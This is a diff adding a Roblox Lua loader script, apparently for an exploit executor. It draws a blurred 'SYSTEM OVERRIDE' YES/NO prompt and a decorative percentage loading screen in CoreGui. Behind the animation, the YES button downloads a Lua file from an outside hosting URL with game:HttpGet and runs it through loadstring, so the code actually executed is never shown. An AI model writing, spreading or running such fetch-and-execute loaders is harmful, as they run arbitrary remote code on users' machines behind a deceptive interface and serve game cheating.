@@ -1,0 +1,155 @@
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+local UIS = game:GetService("UserInputService")
+local Lighting = game:GetService("Lighting")
+
+local LocalPlayer = Players.LocalPlayer
+local blur = Instance.new("BlurEffect")
+blur.Size = 0
+blur.Parent = Lighting
+TweenService:Create(blur, TweenInfo.new(0.6, Enum.EasingStyle.Quart), {Size = 15}):Play()
+
+local C = {
+    MainBG = Color3.fromRGB(10, 10, 10),
+    Stroke = Color3.fromRGB(40, 40, 40),
+    Accent = Color3.fromRGB(255, 255, 255),
+    Text   = Color3.fromRGB(180, 180, 180),
+    BtnBG  = Color3.fromRGB(20, 20, 20),
+}
+
+local sg = Instance.new("ScreenGui")
+sg.Name = "yuzia_X_Protocol"
+sg.ResetOnSpawn = false
+sg.DisplayOrder = 999
+sg.Parent = CoreGui
+
+local function CreateLoadingScreen()
+    local LoadFrame = Instance.new("Frame", sg)
+    LoadFrame.Size = UDim2.new(1, 0, 1, 0)
+    LoadFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+    LoadFrame.BackgroundTransparency = 1
+    LoadFrame.Visible = false
+    LoadFrame.ZIndex = 100
+
+    local CenterCont = Instance.new("Frame", LoadFrame)
+    CenterCont.Size = UDim2.new(0, 300, 0, 300)
+    CenterCont.Position = UDim2.new(0.5, 0, 0.5, 0)
+    CenterCont.AnchorPoint = Vector2.new(0.5, 0.5)
+    CenterCont.BackgroundTransparency = 1
+
+    local Ring = Instance.new("Frame", CenterCont)
+    Ring.Size = UDim2.new(0, 120, 0, 120)
+    Ring.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Ring.AnchorPoint = Vector2.new(0.5, 0.5)
+    Ring.BackgroundTransparency = 1
+    local rStroke = Instance.new("UIStroke", Ring)
+    rStroke.Color = C.Accent
+    rStroke.Thickness = 2
+    Instance.new("UICorner", Ring).CornerRadius = UDim.new(1, 0)
+
+    local Percent = Instance.new("TextLabel", CenterCont)
+    Percent.Size = UDim2.new(1, 0, 0, 50)
+    Percent.Position = UDim2.new(0, 0, 0.5, 0)
+    Percent.AnchorPoint = Vector2.new(0, 0.5)
+    Percent.Text = "0%"
+    Percent.TextColor3 = C.Accent
+    Percent.Font = Enum.Font.GothamBold
+    Percent.TextSize = 32
+    Percent.BackgroundTransparency = 1
+
+    local Status = Instance.new("TextLabel", LoadFrame)
+    Status.Size = UDim2.new(1, 0, 0, 30)
+    Status.Position = UDim2.new(0, 0, 0.5, 100)
+    Status.Text = "LOADING..."
+    Status.TextColor3 = C.Text
+    Status.Font = Enum.Font.Code
+    Status.TextSize = 14
+    Status.BackgroundTransparency = 1
+
+    return LoadFrame, Percent, Ring, Status
+end
+
+local loader, percentLabel, ring, statusLabel = CreateLoadingScreen()
+
+local frame = Instance.new("Frame", sg)
+frame.Size = UDim2.new(0, 0, 0, 0)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = C.MainBG
+frame.BorderSizePixel = 0
+frame.ClipsDescendants = true
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
+local fStroke = Instance.new("UIStroke", frame)
+fStroke.Color = C.Stroke
+
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0, 80)
+title.Position = UDim2.new(0, 0, 0, 10)
+title.Text = "yuzia_X\nSYSTEM OVERRIDE"
+title.TextColor3 = C.Accent
+title.Font = Enum.Font.GothamBold
+title.TextSize = 18
+title.TextTransparency = 1
+title.BackgroundTransparency = 1
+
+local function createBtn(text, pos, isAccent)
+    local btn = Instance.new("TextButton", frame)
+    btn.Size = UDim2.new(0, 125, 0, 36)
+    btn.Position = pos
+    btn.BackgroundColor3 = isAccent and C.Accent or C.BtnBG
+    btn.Text = text:upper()
+    btn.TextColor3 = isAccent and Color3.fromRGB(0,0,0) or C.Text
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 12
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
+    return btn
+end
+
+local yes = createBtn("YES", UDim2.new(0.5, 5, 0.65, 0), true)
+local no  = createBtn("NO", UDim2.new(0.5, -130, 0.65, 0), false)
+
+TweenService:Create(frame, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, 320, 0, 160)}):Play()
+task.wait(0.2)
+TweenService:Create(title, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
+
+local function RunSuperLoading()
+    frame.Visible = false
+    loader.Visible = true
+    TweenService:Create(loader, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
+
+    for i = 0, 100, 2 do
+        percentLabel.Text = i .. "%"
+        local pulse = ring:Clone()
+        pulse.Parent = ring.Parent
+        pulse.Visible = true
+        TweenService:Create(pulse, TweenInfo.new(0.5), {Size = UDim2.new(0, 300, 0, 300), BackgroundTransparency = 1}):Play()
+        game:GetService("Debris"):AddItem(pulse, 0.5)
+        task.wait(0.02)
+    end
+
+    task.wait(0.3)
+    TweenService:Create(loader, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(blur, TweenInfo.new(0.8), {Size = 0}):Play()
+    task.wait(0.8)
+    sg:Destroy()
+end
+
+yes.MouseButton1Click:Connect(function()
+    task.spawn(RunSuperLoading)
+    task.spawn(function()
+        local url = "https://api.getpolsec.com/scripts/hosted/7d897c3ce6dc614166b76de80884633fcab2cd086cb0c9c7de1188129ce23dbc.lua"
+        local success, content = pcall(function() return game:HttpGet(url .. "?cache=" .. tick()) end)
+        if success and content then
+            local func = loadstring(content)
+            if func then func() end
+        end
+    end)
+end)
+
+no.MouseButton1Click:Connect(function()
+    TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)}):Play()
+    TweenService:Create(blur, TweenInfo.new(0.3), {Size = 0}):Play()
+    task.wait(0.3)
+    sg:Destroy()
+end)
